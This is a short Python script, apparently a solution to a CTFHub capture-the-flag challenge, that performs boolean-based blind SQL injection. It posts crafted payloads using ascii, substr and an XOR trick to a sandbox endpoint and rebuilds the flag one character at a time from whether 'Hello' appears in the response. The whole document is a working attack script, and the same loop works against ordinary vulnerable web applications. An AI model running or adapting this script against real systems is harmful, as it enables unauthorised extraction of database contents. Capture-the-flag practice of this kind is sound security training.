#sql盲注
import requests
import time

url = 'http://challenge-0661dc3e4bdfff3f.sandbox.ctfhub.com:10800/index.php'
flag = ''
for j in range(17,50):
    for i in range(32,126):
        payload = '1^(if((ascii(substr((select(flag)from(flag)),{0},1))={1}),0,1))'.format(j,i)
        data = {
            'id': payload
        }
        res = requests.post(url=url,data=data)
        if 'Hello' in res.text:
            flag += chr(i)
            print(flag)
        time.sleep(0.1)
